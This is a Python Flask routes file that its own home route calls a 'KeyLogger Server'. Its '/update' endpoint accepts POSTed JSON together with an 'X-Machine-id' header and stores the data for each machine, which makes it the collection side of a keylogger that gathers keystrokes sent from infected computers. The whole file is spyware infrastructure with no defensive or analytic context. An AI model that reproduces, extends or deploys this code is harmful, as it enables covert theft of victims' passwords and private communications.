from flask import Flask, render_template, request, jsonify, Blueprint
import os

from flask import Flask

from app.services.post_service import data_to_memo


bp = Blueprint("routes", __name__)


@bp.route('/')
def home():
    return  "KeyLogger Server is Running" 



@bp.route('/update', methods=['POST'])
def update():

    data = request.json
    machine_name = request.headers.get('X-Machine-id', None)
    if not machine_name:
        return jsonify({"error": "Invalid payload"}), 400
    if data:
        data_to_memo(data,machine_name)
    return jsonify({"status": "success"}), 200





